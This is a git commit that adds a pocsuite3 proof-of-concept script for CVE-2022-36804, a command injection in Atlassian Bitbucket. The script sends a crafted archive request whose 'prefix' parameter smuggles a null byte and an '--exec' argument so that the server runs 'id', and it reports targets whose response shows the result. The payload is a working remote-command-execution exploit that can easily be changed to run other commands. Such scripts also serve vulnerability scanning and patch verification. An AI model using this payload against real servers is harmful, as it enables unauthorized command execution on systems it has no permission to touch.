ac430b5dd4abdffda97482f01a93815608809b34
桜 <58284151+luck-ying@users.noreply.github.com>
2022-11-03 14:41:13 +0800

    Add files via upload

---
+++ Atlassian-Bitbucket/Atlassian_Bitbucket_archive_RCE_CVE_2022_36804.py
@@ -0,0 +1,74 @@
+from collections import OrderedDict
+from urllib.parse import urljoin
+import re
+from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
+from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY
+import json
+import os
+
+
+class POC(POCBase):
+    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
+    version = '1'  # 默认为1
+    author = ['']  # PoC作者的大名
+    vulDate = '2022-11-03'  # 漏洞公开的时间,不知道就写今天
+    createDate = '2022-11-03'  # 编写 PoC 的日期
+    updateDate = '2022-11-03'  # PoC 更新的时间,默认和编写时间一样
+    references = ['']  # 漏洞地址来源,0day不用写
+    name = 'Atlassian Bitbucket archive RCE'  # PoC 名称
+    appPowerLink = ''  # 漏洞厂商主页地址
+    appName = 'Bitbucket'  # 漏洞应用名称
+    appVersion = '''https://www.venustech.com.cn/new_type/aqtg/20220829/24416.html'''  # 漏洞影响版本
+    vulType = VUL_TYPE.COMMAND_EXECUTION  # 漏洞类型,类型参考见 漏洞类型规范表
+    desc = '''
+        CVE-2022-36804: Atlassian Bitbucket 命令注入漏洞
+    '''
+
+  # 漏洞简要描述
+    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
+    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
+    pocDesc = '''
+    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify
+    '''
+    category = POC_CATEGORY.EXPLOITS.REMOTE
+
+    def _verify(self):
+        result = {}
+        path = "/rest/api/latest/projects/RIS-PRO/repos/ris-mysql-interface/archive?filename=pBwTw&at=pBwTw&path=pBwTw&prefix=ax%00--exec=%60id%60%00--remote=origin"
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
+        }
+        url = self.url + path
+        try:
+            resq = requests.get(url=self.url+path,headers=headers,timeout=5)
+            #print(re.search('uid=.*\(([a-z]+)\):', resq.text).group())
+            if re.search('uid=.*\(([a-z]+)\):', resq.text).group() in resq.text:
+                result['VerifyInfo'] = {}
+                result['VerifyInfo']['POC'] = self.url+path
+        except Exception as e:
+            print(e)
+            return
+        return self.parse_output(result)
+
+    def _attack(self):
+        return self._verify()
+
+    def parse_attack(self, result):
+        output = Output(self)
+        if result:
+            output.success(result)
+        else:
+            output.fail('target is not vulnerable')
+        return output
+
+    def _shell(self):
+        return
+
+    def parse_output(self, result):
+        output = Output(self)
+        if result:
+            output.success(result)
+        else:
+            output.fail('target is not vulnerable')
+        return output
+register_poc(POC)
